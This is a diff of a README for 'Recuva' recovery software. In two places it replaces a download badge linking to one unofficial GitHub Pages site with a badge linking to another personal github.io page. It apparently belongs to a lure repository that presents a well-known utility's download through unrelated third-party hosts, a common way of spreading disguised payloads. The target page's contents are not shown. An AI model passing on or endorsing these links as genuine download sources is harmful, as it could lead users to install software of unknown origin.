@@ -4,11 +4,8 @@
   <img src="https://media.licdn.com/dms/image/v2/C4D12AQFzSbTlWHFQWA/article-cover_image-shrink_720_1280/article-cover_image-shrink_720_1280/0/1520165746201?e=2147483647&v=beta&t=7NY-549ORZLbIq5MfWuFi5VkTeHCCTN7tSzljgZ4fCU" alt="Recuva Logo"/>
 </div>
 
-<div align="center">
+[![GET Recuva Recovery](https://img.shields.io/badge/GET%20%E2%80%94%20Recuva-Recovery-0078D6?style=for-the-badge&logoColor=white)](https://faysonblossom.github.io/.github/Recuva-Recovery)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://recuva-recovery-software.github.io/.github/)
-
-</div>
 
 ---
 
@@ -28,11 +25,8 @@ The environment further extends into solid-state storage using recuva ssd logic.
   <img src="https://cdn.mos.cms.futurecdn.net/n4KBNUqGffjkeMMRWbZUYe.jpg" alt="Recuva Interface Screenshot"/>
 </div>
 
-<div align="center">
+[![GET Recuva Recovery](https://img.shields.io/badge/GET%20%E2%80%94%20Recuva-Recovery-0078D6?style=for-the-badge&logoColor=white)](https://faysonblossom.github.io/.github/Recuva-Recovery)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://recuva-recovery-software.github.io/.github/)
-
-</div>
 
 ---
 
